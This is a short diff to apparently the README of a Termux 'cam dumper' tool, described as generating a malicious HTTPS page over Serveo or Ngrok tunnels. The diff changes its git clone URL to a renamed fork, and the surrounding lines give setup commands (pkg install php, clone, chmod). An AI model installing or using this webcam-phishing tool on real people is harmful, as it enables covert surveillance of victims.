@@ -15,9 +15,9 @@ The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding 
 
 >pkg install php
 
->git clone https://github.com/TermuxHackz/CAM-DUMPER
+>git clone https://github.com/navyej/Nav-Cam-Dumper
 
->cd CAM-DUMPER
+>cd NAV-CAM-DUMPER
 
 >chmod +x NavCamDumper.sh ngrok
 
